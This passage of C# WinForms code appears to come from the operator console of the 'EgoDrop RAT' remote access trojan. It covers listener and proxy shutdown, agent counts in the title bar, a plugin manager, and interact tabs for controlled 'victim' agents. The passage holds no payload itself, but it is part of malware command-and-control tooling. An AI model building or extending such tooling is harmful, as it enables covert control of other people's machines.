            frmProxy f = new frmProxy(this, m_sqlite, victim, szID, node.szDisplayName.Split('@').Last());
            f.Show();

            fnRefreshListenerTreeView();
        }

        private void frmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (string szName in m_dicListener.Keys)
                m_dicListener[szName].fnStop();

            foreach (string szName in m_dicLtnProxy.Keys)
                m_dicLtnProxy[szName].fnStop();

            timer1.Stop();
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton3_CheckStateChanged(object sender, EventArgs e)
        {
            networkView1.DisplayProtocol = toolStripButton3.Checked;
        }

        /// <summary>
        /// Update current state.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timer1_Tick(object sender, EventArgs e)
        {
            Text = $"EgoDrop RAT {m_szVersion} (by. ISSAC/iss4cf0ng) | " +
                $"Agent[{listView1.Items.Count}] - Selected[{listView1.SelectedItems.Count}] | " +
                $"Listener[{m_dicListener.Count}] | " +
                $"Proxy[{m_dicLtnProxy.Count}]";
        }

        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem30_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szID = item.SubItems[1].Text;

                clsAgent agent = m_dicAgent[szID];

                frmPluginMgr f = new frmPluginMgr(this, agent);

                f.Show();
            }
        }

        private void toolStripMenuItem31_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            TabPage page = fnFindInteractTab(node.Agent);
            if (page == null)
                page = fnCreateNewInteractPage(node.Agent);

            tabControl1.SelectedTab = page;
        }

        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            clsAgent agent = node.Agent;
            if (agent == null)
                return;

            frmPluginMgr f = clsTools.fnFindForm<frmPluginMgr>(agent);
            if (f == null)
            {
                f = new frmPluginMgr(this, agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void tabControl1_DrawItem(object sender, DrawItemEventArgs e)
        {
            TabControl tab = (TabControl)sender;
            if (sender == null)
                return;

            TabPage page = tab.TabPages[e.Index];

            bool bIsSelected = e.Index == tab.SelectedIndex;


        }

        private void tabControl1_MouseDown(object sender, MouseEventArgs e)
        {

        }
    }
}
